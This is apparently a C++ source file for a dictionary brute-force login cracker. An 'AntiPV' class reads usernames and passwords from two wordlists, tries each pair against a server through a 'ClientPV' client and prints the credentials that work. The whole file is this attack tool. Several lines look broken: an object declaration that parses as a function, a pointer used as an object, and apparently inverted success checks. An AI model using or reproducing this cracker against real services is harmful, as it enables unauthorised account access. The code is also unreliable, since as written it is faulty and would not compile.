class Dictionary{
private:FILE* fp;
public: Dictionary(char*);
	~Dictionary();
	char* read();
	void reset();
};
Dictionary::Dictionary(char* filename) {
	fp = fopen(filename,"r");
}
Dictionary::~Dictionary() {
	fclose(fp);
}
char* Dictionary::read() {
	return read_row_from_file(fp);
}
void Dictionary::reset() {
	fseek(fp, 0, SEEK_SET);	
}
//-------------------------------------------------------------------
class AntiPV{
private:Dictionary* userids;
	Dictionary* passwds;
public:	AntiPV(char*,char*);
	~AntiPV();
	void crack(Address*);
	void crackLoop(Address*, ClientPV*, char* user);
};
AntiPV::AntiPV(char* users, char* passwords) {
	userids = new Dictionary(users);
	passwds = new Dictionary(passwords);
}
AntiPV::~AntiPV() {
	delete userids;
	delete passwds;
}
void AntiPV::crack(Address* server) {
	ClientTCP client();
	ClientPV* myself = new ClientPV(client);
	userids->reset();
	while(char* user = userids->read()) {
		passwds->reset();
		crackLoop(server,myself,user);
	}
}	
void AntiPV::crackLoop(Address* server, ClientPV* myself, char* user)	{
	char* password = passwds->read();
	bool valid_user = true;
	while(password && valid_user){
		myself.connetti(server);
		if(!myself.try_user(user)) {
			if(!myself.try_password(password)) {
				printf("User: %s\tPassword: %s\n", user, password);
				free(password);
				password = NULL;
			} else {
				free(password);
				password = passwds->read();
			}
		} else {
			valid_user = false;
		}
	}
}


void fri(char* s){
	free(s);
	s = NULL;
}
